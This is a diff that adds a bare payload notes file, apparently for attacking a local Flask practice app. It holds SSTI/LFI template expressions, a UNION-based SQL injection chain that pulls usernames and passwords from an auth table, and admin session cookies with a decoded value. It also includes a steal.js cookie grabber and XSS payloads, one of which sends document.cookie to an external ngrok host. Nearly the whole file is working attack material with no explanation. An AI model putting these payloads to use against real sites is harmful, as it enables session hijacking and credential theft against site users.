@@ -1,0 +1,52 @@
+ATTACK 1 SSTI + LFI
+{{person.secret}}
+{{get_user_file()}}
+
+ATTACK 2 SQL INJECTION
+
+'union select null,database() -- #'
+
+'union select null,table_name from information_schema.tables where table_schema=database()-- #
+
+'union select null,column_name from information_schema.columns where table_schema=database() and table_name="auth" -- #
+
+'union select username,password from auth -- #
+
+----------------------------------------------------------
+Developer things
+
+admin cookie
+
+eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyIjoiWm9ob0FkbWluIn0.Yo18yg.n_3qZm36A84A4vlgcmAJjkKnN-A
+
+zoho cookie
+
+eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyIjoiem9obyJ9.Yo17pQ.NyXVHX4RapgXM8fSiDLGxYyqgZg
+
+steal.js
+var cookie = document.cookie
+document.location.href="url/+cookie"
+
+<script src="https://e680-183-82-206-250.in.ngrok.io/steal.js"><script>
+
+<script>alert(document.cookie)</script>
+
+http://127.0.0.1:5000/dsa?name=%3Cscript%20src=%22https://e680-183-82-206-250.in.ngrok.io/steal.js%22%3E%3Cscript%3E
+
+http://127.0.0.1:5000/dsa?name=%3Cscript%20src="http://127.0.1"
+<script src="https://5ace-183-82-206-250.in.ngrok.io/steal.js"></script>
+
+<img src=x onerror=this.src='https://5ace-183-82-206-250.in.ngrok.io/steal.js'+document.cookie;>
+
+----------
+flask admin cookie and decoded value
+eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyIjoiWm9ob0FkbWluIn0.Yo2q3g.8gvKCFHNIGgm46T8o8md_ywSKZE
+
+''{
+    "_permanent": true,
+    "user": "ZohoAdmin"
+}''
+
+XSS ENDPOINT URL
+
+http://127.0.0.1:5000/lfissti?name=
